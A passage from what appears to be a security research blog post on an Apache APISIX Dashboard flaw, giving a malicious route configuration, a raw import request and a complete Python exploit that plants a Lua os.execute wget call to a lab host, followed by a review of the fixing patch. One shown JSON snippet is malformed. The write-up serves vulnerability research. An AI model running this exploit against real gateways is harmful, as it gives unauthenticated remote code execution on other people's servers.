+<p>It contains an array of routes, each with an <code class="language-plaintext highlighter-rouge">ID</code>, <code class="language-plaintext highlighter-rouge">URIs</code>, <code class="language-plaintext highlighter-rouge">methods</code>, and a <code class="language-plaintext highlighter-rouge">Lua</code> script. Additionally, there is an array of <code class="language-plaintext highlighter-rouge">upstreams</code>, each with a <code class="language-plaintext highlighter-rouge">name</code>, <code class="language-plaintext highlighter-rouge">type</code>, <code class="language-plaintext highlighter-rouge">scheme</code>, <code class="language-plaintext highlighter-rouge">nodes</code>, and <code class="language-plaintext highlighter-rouge">timeout</code>. Also arrays for <code class="language-plaintext highlighter-rouge">consumers</code>, <code class="language-plaintext highlighter-rouge">services</code>, SSLs, <code class="language-plaintext highlighter-rouge">global plugins</code>, and <code class="language-plaintext highlighter-rouge">plugin configs</code>. Now, Let’s get our malicious configration ready:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>{"Counsumers":[],"Routes":[{"id":"387796883096994503","create_time":1640674554,"update_time":1640677637,"uris":["/rce"],"name":"rce","methods":["GET","POST","PUT","DELETE","PATCH","HEAD","OPTIONS","CONNECT","TRACE"],"script":"os.execute('wget http://172.16.69.246:8000/Pwn3d')","script_id":"387796883096994503","upstream_id":"387796832866009799","status":1}],"Services":[],"SSLs":[],"Upstreams":[{"id":"387796832866009799","create_time":1640674524,"update_time":1640674524,"nodes":[{"host":"localhost","1337":,"weight":1}],"timeout":{"connect":6,"read":6,"send":6},"type":"roundrobin","scheme":"http","pass_host":"pass","name":"testUpstream"}],"GlobalPlugins":[],"PluginConfigs":[]}
+</code></pre></div></div>
+
+<p>Basically, Here we set a route named <code class="language-plaintext highlighter-rouge">/rce</code> and it accepts all <code class="language-plaintext highlighter-rouge">HTTP</code> methods &amp; Then, Under the <code class="language-plaintext highlighter-rouge">script</code> key we put the <code class="language-plaintext highlighter-rouge">lua</code> script as a command system to be executed, In this case it’s gonna request our the <code class="language-plaintext highlighter-rouge">Pwn3d</code> endpoint from our http server.</p>
+
+<p>Normal Request:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>POST /apisix/admin/migrate/import HTTP/1.1
+Host: 172.16.69.246:9000
+User-Agent: UserAgents
+Accept-Encoding: gzip, deflate
+Accept: */*
+Connection: close
+Content-Length: 995
+Content-Type: multipart/form-data; boundary=d63fe4d72d026b3884925933bababb59
+
+--d63fe4d72d026b3884925933bababb59
+Content-Disposition: form-data; name="mode"
+
+overwrite
+--d63fe4d72d026b3884925933bababb59
+Content-Disposition: form-data; name="file"; filename="test"
+
+{"Counsumers": [], "Routes": [{"id": "387796883096994503", "create_time": 1640674554, "update_time": 1640677637, "uris": ["/rce"], "name": "rce", "methods": ["GET", "POST", "PUT", "DELETE", "PATCH", "HEAD", "OPTIONS", "CONNECT", "TRACE"], "script": "os.execute('wget http://172.16.69.246:8000/Pwn3d')", "script_id": "387796883096994503", "upstream_id": "387796832866009799", "status": 1}], "Services": [], "SSLs": [], "Upstreams": [{"id": "387796832866009799", "create_time": 1640674524, "update_time": 1640674524, "nodes": [{"host": "10.18.134.63", "port": 58344, "weight": 1}], "timeout": {"connect": 6, "read": 6, "send": 6}, "type": "roundrobin", "scheme": "http", "pass_host": "pass", "name": "testUpstream"}], "GlobalPlugins": [], "PluginConfigs": []}6ó
+--d63fe4d72d026b3884925933bababb59--
+</code></pre></div></div>
+
+<p>Here is our python code to send the request:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>import requests
+import json
+import zlib
+
+url = "http://172.16.69.246:9000"
+gateway_url = "http://172.16.69.246:9080"
+cmd = "wget http://172.16.69.246:8000/Pwn3d"
+
+def exploit(url, gateway_url, cmd):
+    payload, err = gen(cmd)
+    if err is not None:
+        print(err)
+        return
+    create_route(payload, url)
+    request_endpoint(gateway_url)
+
+def request_endpoint(gateway_url):
+    res = requests.get(gateway_url + "/rce")
+    print(res.text)
+
+def create_route(payload, url):
+    files = {
+        'file': ('test', payload)
+    }
+    data = {
+        'mode': 'overwrite'
+    }
+    res = requests.post(url + '/apisix/admin/migrate/import', files=files, data=data)
+    print(res.text)
+
+def gen(cmd):
+    data = {
+        "Counsumers": [],
+        "Routes": [
+            {
+                "id": "387796883096994503",
+                "create_time": 1640674554,
+                "update_time": 1640677637,
+                "uris": ["/rce"],
+                "name": "rce",
+                "methods": [
+                    "GET",
+                    "POST",
+                    "PUT",
+                    "DELETE",
+                    "PATCH",
+                    "HEAD",
+                    "OPTIONS",
+                    "CONNECT",
+                    "TRACE"
+                ],
+                "script": f"os.execute('{cmd}')",
+                "script_id": "387796883096994503",
+                "upstream_id": "387796832866009799",
+                "status": 1
+            }
+        ],
+        "Services": [],
+        "SSLs": [],
+        "Upstreams": [
+            {
+                "id": "387796832866009799",
+                "create_time": 1640674524,
+                "update_time": 1640674524,
+                "nodes": [
+                    {
+                        "host": "localhost",
+                        "port": 1337,
+                        "weight": 1
+                    }
+                ],
+                "timeout": {
+                    "connect": 6,
+                    "read": 6,
+                    "send": 6
+                },
+                "type": "roundrobin",
+                "scheme": "http",
+                "pass_host": "pass",
+                "name": "testUpstream"
+            }
+        ],
+        "GlobalPlugins": [],
+        "PluginConfigs": []
+    }
+
+    json_data = json.dumps(data).encode('utf-8')
+    checksum = zlib.crc32(json_data).to_bytes(4, byteorder='big')
+    content = json_data + checksum
+
+    import_data = content[:-4]
+    checksum2 = int.from_bytes(content[-4:], byteorder='big')
+    if checksum2 != zlib.crc32(import_data):
+        return None, "Checksum check failure,maybe file broken"
+
+    return content, None
+
+exploit(url, gateway_url, cmd)
+</code></pre></div></div>
+
+<p>And now let’s try to execute or code and check it out:</p>
+
+<p><img src="/assets/images/d84b6cc540da7630f7d567a08c17839b" alt="" /></p>
+
+<h1 id="patch-diffing"><strong>Patch Diffing</strong></h1>
+
+<p>Now, Let’s take a look at the patch that used to prevent the vulnerability, We can see the patch information on <code class="language-plaintext highlighter-rouge">github</code>from <a href="https://github.com/apache/apisix-dashboard/commit/b565f7cd090e9ee2043fbb726fbaae01737f83cd?diff=split">here</a>. The changes applied to a lot of files, So we will be focusing on the important ones.</p>
+
+<h3 id="apiinternalcoreserverhttpgo">api/internal/core/server/http.go</h3>
+
+<p><img src="/assets/images/ba6d3e7b54e1a5925538c309575d92a5" alt="" /></p>
+
+<p>The <code class="language-plaintext highlighter-rouge">AuthenticationMiddleware</code> middleware from the filter package was removed and the <code class="language-plaintext highlighter-rouge">ErrorTransformMiddleware</code> middleware from the handler package was added as the <code class="language-plaintext highlighter-rouge">ErrorTransformMiddleware</code> middleware from the handler package may be more suitable for catching errors.</p>
+
+<h3 id="apiinternalfilterauthenticationgo">api/internal/filter/authentication.go</h3>
+
+<p><img src="/assets/images/89e51847d4119b187e61c8dc1a39138d" alt="" /></p>
+
+<p>Here we can see the new implementation uses <code class="language-plaintext highlighter-rouge">gin.Context</code> instead of <code class="language-plaintext highlighter-rouge">droplet.Context</code> and basically, it’s refactoring the <code class="language-plaintext highlighter-rouge">AuthenticationMiddleware</code> into a <code class="language-plaintext highlighter-rouge">gin.HandlerFunc</code> function. The changes done as the following,The <code class="language-plaintext highlighter-rouge">BaseMiddleware</code> is no longer used ansd replaced with <code class="language-plaintext highlighter-rouge">gin</code> to handle the middleware stack, Then <code class="language-plaintext highlighter-rouge">Handle()</code> method is replaced with a function which returns a <code class="language-plaintext highlighter-rouge">gin.HandlerFunc</code> to <code class="language-plaintext highlighter-rouge">Authentication()</code>. <code class="language-plaintext highlighter-rouge">httpReq := ctx.Get(middleware.KeyHttpRequest)</code> and <code class="language-plaintext highlighter-rouge">req := httpReq.(*http.Request)</code> replaced with <code class="language-plaintext highlighter-rouge">c.Request</code>. So, instead of retrieving the request object from the <code class="language-plaintext highlighter-rouge">droplet.Context</code> using <code class="language-plaintext highlighter-rouge">ctx.Get(middleware.KeyHttpRequest)</code> and <code class="language-plaintext highlighter-rouge">httpReq.(*http.Request)</code>, the <code class="language-plaintext highlighter-rouge">http.Request</code> object is directly retrieved from the <code class="language-plaintext highlighter-rouge">gin.Context</code> object using <code class="language-plaintext highlighter-rouge">c.Request</code>. Also, the response object is replaced with a <code class="language-plaintext highlighter-rouge">gin.H</code> object which is a shorthand for creating <code class="language-plaintext highlighter-rouge">JSON</code> responses.Finally, the <code class="language-plaintext highlighter-rouge">AbortWithStatusJSON()</code> method is used to return the response with an <code class="language-plaintext highlighter-rouge">HTTP</code> status code.</p>
+
+<h3 id="apiinternalroutego">api/internal/route.go</h3>
+
+<p><img src="/assets/images/e9645204b5dd0007ef5140b95bfb0f81" alt="" /></p>
+
+<p>Here this change is to add authentication to the <code class="language-plaintext highlighter-rouge">gin</code> application. By inserting the <code class="language-plaintext highlighter-rouge">filter.Authentication()</code> middleware into the middleware chain and the application will first check if the user is authenticated before allowing them to access protected routes. If the user is not authenticated, they will receive an unauthorized response. If the user is authenticated, the middleware chain will continue to execute and the request will be handled normally.</p>
+
+<p>Finally, The other changes is for test cases like <code class="language-plaintext highlighter-rouge">upstream</code>, <code class="language-plaintext highlighter-rouge">route</code> and so on.</p>
+
+<h1 id="conclusion"><strong>Conclusion</strong></h1>
+
+<p>We analyzed the the vulnerability and highlited the root cause of it, We show it dynamically how the routes get initialized and Also how the wrapped ones get wrapped by the <code class="language-plaintext highlighter-rouge">Wraps()</code> function to apply the middleware for it, And how the issue was caused by using the <code class="language-plaintext highlighter-rouge">gin</code> framework directly without Wrapping it when handling the routes of the configurations and finally, achieving RCE from it.</p>
+
+<h1 id="resources"><strong>Resources</strong></h1>
+
+<ul>
+  <li>
+    <p>https://github.com/apache/apisix-dashboard</p>
+  </li>
+  <li>
+    <p>https://github.com/apache/apisix-docker</p>
+  </li>
+  <li>
+    <p>https://www.jetbrains.com/go/</p>
+  </li>
+  <li>
+    <p>https://github.com/go-delve/delve/tree/master/Documentation/installation</p>
+  </li>
+  <li>
+    <p>https://etcd.io/docs/v3.4/install/</p>
+  </li>
+  <li>
+    <p>https://apisix.apache.org/docs/apisix/getting-started/</p>
+  </li>
+  <li>
+    <p><a href="https://apisix.apache.org/docs/dashboard/USER_GUIDE/">https://apisix.apache.org/docs/dashboard/USER_GUIDE/</a></p>
+  </li>
+  <li>
+    <p>https://github.com/apache/apisix-dashboard/commit/b565f7cd090e9ee2043fbb726fbaae01737f83cd#diff-a16bc2c469646367bf6d9f635ee85a8e13109732bdb0caba8cec71f015bc0c1c</p>
+  </li>
+</ul>
+
+        
+      </section>
+
+      <footer class="page__meta">
+        
+        
+
+
+  
+
+
+  
+  
+  
+
+  <p class="page__taxonomy">
+    <strong><i class="fas fa-fw fa-folder-open" aria-hidden="true"></i> Categories: </strong>
+    <span itemprop="keywords">
+    
+      
+      
+      <a href="/categories/#security-research" class="page__taxonomy-item" rel="tag">Security Research</a>
+    
+    </span>
+  </p>
+
+
+        
+          <p class="page__date"><strong><i class="fas fa-fw fa-calendar-alt" aria-hidden="true"></i> Updated:</strong> <time datetime="2023-05-09T00:00:00+08:00">May 9, 2023</time></p>
+        
+      </footer>
+
+      
+
+      
+  <nav class="pagination">
+    
+      <a href="/security%20research/CVE_2022_22733_exploit/" class="pagination--pager" title="Exploit Writing: CVE-2022-22733 Privilege Escalation &amp; RCE
+">Previous</a>
+    
+    
+      <a href="/security%20research/CVE_2021_44521/" class="pagination--pager" title="CVE-2021-44521: Apache Cassandra Remote Code Execution
+">Next</a>
+    
+  </nav>
+
+    </div>
+
+    
+  </article>
+
+  
+  
+</div>
+
+    </div>
+
+    
+      <div class="search-content">
+        <div class="search-content__inner-wrap"><form class="search-content__form" onkeydown="return event.key != 'Enter';">
+    <label class="sr-only" for="search">
+      Enter your search term...
+    </label>
+    <input type="search" id="search" class="search-input" tabindex="-1" placeholder="Enter your search term..." />
+  </form>
+  <div id="results" class="results"></div></div>
+
+      </div>
+    
+
+    <div id="footer" class="page__footer">
+      <footer>
+        <!-- start custom footer snippets -->
+
+<!-- end custom footer snippets -->
+        <div class="page__footer-follow">
+  <ul class="social-icons">
+    
+      <li><strong>Follow:</strong></li>
+    
+
+    
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+    
+
+    <li><a href="/feed.xml"><i class="fas fa-fw fa-rss-square" aria-hidden="true"></i> Feed</a></li>
+  </ul>
+</div>
+
+<div class="page__footer-copyright">&copy; 2024 Zeyad Azima. Powered by <a href="https://jekyllrb.com" rel="nofollow">Jekyll</a> &amp; <a href="https://mademistakes.com/work/minimal-mistakes-jekyll-theme/" rel="nofollow">Minimal Mistakes</a>.</div>
+
+      </footer>
+    </div>
+
+    
+  <script src="/assets/js/main.min.js"></script>
+  <script src="https://kit.fontawesome.com/4eee35f757.js"></script>
+
+
+
+
+<script src="/assets/js/lunr/lunr.min.js"></script>
+<script src="/assets/js/lunr/lunr-store.js"></script>
+<script src="/assets/js/lunr/lunr-en.js"></script>
+
+
+
+
+
+
+
+  </body>
+</html>
